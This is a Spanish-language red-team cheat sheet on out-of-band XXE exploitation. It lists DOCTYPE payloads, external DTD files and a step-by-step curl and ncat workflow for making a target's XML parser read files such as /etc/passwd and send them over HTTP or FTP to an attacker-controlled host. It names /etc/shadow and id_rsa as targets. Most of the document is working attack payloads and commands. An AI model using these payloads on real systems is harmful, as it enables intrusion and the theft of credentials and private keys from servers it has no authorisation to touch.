---
aliases:
  - XXE Out-of-Band (OOB)
  - XXE OOB
tags:
  - vuln/xxe
  - technique/execution
  - asset/web-app
primary categories:
  - "[[Red Team]]"
secondary categories:
  - "[[Explotación]]"
  - "[[Web]]"
tertiary categories:
  - "[[Web Explotación]]"
kind: SubCheatSheet
linked:
  - "[[XML External Entity (XXE)]]"
---
# XXE - Out-of-Band (OOB) y DTDs Externos

---

## Cheatsheet

| **Payload** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://ATTACKER/exfil.dtd"> %xxe;]><foo/>` (+ DTD HTTP exfil) | Archivo target via GET `?data=<contenido>` a tu servidor | Egress HTTP saliente permitido. |
| Mismo payload con DTD que use `convert.base64-encode` | Archivos multilínea o binarios en base64 | Target con `\n` (`/etc/shadow`, `id_rsa`) o XML-rompedores. |
| `<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://ATTACKER/ftp.dtd"> %xxe;]><foo/>` (+ DTD FTP) | Archivo via conexión `ftp://` | HTTP egress bloqueado, FTP permitido (común en Java). |
| `<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://CANARY.oast.fun/probe"> %xxe;]><foo/>` | Callback DNS + HTTP en Collaborator | Detección blind sin necesidad de exfil. |
| `<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "ftp://CANARY.oast.fun/probe"> %xxe;]><foo/>` | Callback FTP | Verificación de schema soportado por el parser. |
^xxe-oob

### DTD externo HTTP exfil (`exfil.dtd`)

```xml
<!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://ATTACKER/log?data=%file;'>">
%eval;
%exfil;
```

### DTD externo FTP exfil (`ftp.dtd`)

```xml
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'ftp://ATTACKER/%file;'>">
%eval;
%exfil;
```

### Workflow rápido

```bash
# 1. Servir DTD malicioso
python3 -m http.server 8000  # exfil.dtd en cwd

# 2. Log de exfil — capturar parámetro 'data'
ncat -lkvp 8000 2>&1 | tee xxe.log
# o nginx access log con $arg_data

# 3. Enviar payload
curl -X POST https://target/api -H 'Content-Type: application/xml' --data \
  '<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://YOUR_IP:8000/exfil.dtd"> %xxe;]><foo/>'

# 4. Detección blind con Collaborator (sin exfil)
curl -X POST https://target/api -H 'Content-Type: application/xml' --data \
  '<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://CANARY.oast.fun/xxe-probe"> %xxe;]><foo/>'
# Verificar pollers en Collaborator → DNS + HTTP hit confirma resolución de entities

# 5. FTP exfil cuando HTTP bloqueado (Java targets)
ftpserver.py -p 21  # ej: github.com/ONsec-Lab/scripts/blob/master/xxe-ftp-server.rb
```

---

## Overview

OOB se usa cuando hay **vulnerabilidad confirmada pero la app no refleja ni emite errores verbose**. El parser descarga un DTD externo, lee el archivo target, lo concatena como query/path de una URL hacia el atacante → contenido aparece en logs del servidor controlado.

### Mecanismo

1. **Payload inicial** carga DTD remoto vía `<!ENTITY % xxe SYSTEM "http://ATTACKER/...">`.
2. **DTD externo** define entidades anidadas — el subset interno prohíbe entity-defining-entity, pero el externo lo permite.
3. **Entidad `%exfil`** se construye dinámicamente con el contenido del archivo como parte de la URL.
4. Parser hace la request al atacante → contenido queda en logs.

### Limitaciones

- **Egress filtering:** servidores cloud con _deny-all_ outbound → pivotar a [[XXE - DTDs Locales]] o [[XXE - Blind Basado en Errores]].
- **Saltos de línea:** archivos multilínea rompen URL HTTP en parsers modernos → wrapper `php://filter/read=convert.base64-encode/resource=` (PHP) o FTP exfil (Java/.NET).
- **Esquemas:** `http`/`https` universal; `ftp` en Java; `gopher` raramente.

---
